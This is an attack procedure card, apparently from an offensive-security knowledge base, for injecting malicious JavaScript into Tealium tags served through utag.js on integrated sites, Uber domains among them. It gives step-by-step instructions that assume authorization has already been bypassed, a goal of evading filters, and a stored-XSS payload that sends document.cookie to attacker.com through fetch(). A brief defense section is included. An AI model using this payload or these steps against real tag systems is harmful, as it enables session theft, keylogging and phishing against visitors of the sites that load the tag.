---
id: proc-uuid-2
tags:
  - javascript-injection
  - xss
  - payload-injection
  - tealium
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:52:44.451Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject Malicious JavaScript into Tealium Tag

## Summary

This procedure involves embedding arbitrary JavaScript into a Tealium tag, leveraging the lack of content validation to store malicious code served via utag.js on integrated sites.

## Description

Once authorization is bypassed, the tag creation editor allows insertion of unsanitized JavaScript into the utag.js file hosted on tags.tiqcdn.com. This code executes whenever the tag loads on client pages, such as Uber domains, enabling stored XSS for DOM manipulation, data theft, or phishing.

## Requirements

1. Active session in Tealium with bypassed authorization
2. Crafted JavaScript payload (e.g., for alert, cookie theft, or keylogging)
3. Target account configured for utag.js loading

## Defense

Defensive measures and detection strategies:

- Sanitize and validate all tag content before publishing
- Implement content security policy (CSP) on loading pages
- Monitor for anomalous JavaScript in tag files via static analysis

## Objectives

1. Insert executable JavaScript payload
2. Publish the tag for immediate serving
3. Ensure payload evades basic filters

## Instructions

### Step 1: Open Tag Editor

**Context**: Access the configuration area for payload insertion.

In the tag creation form, locate the JavaScript or HTML content field.

> The editor opens without restrictions on input type.

### Step 2: Insert Payload

**Context**: Embed the malicious code to execute on load.

Enter JavaScript such as `<script>document.body.innerHTML += '<h1>XSS Payload</h1>'; fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>` into the field.

> Payload is accepted as plain text/HTML without escaping.

### Step 3: Publish and Verify

**Context**: Deploy the tag and confirm injection.

Save and publish the tag, then inspect the utag.js URL (e.g., https://tags.tiqcdn.com/.../utag.js) in a browser.

> Payload appears in the source, ready for execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- javascript-injection
- stored-xss
- tealium
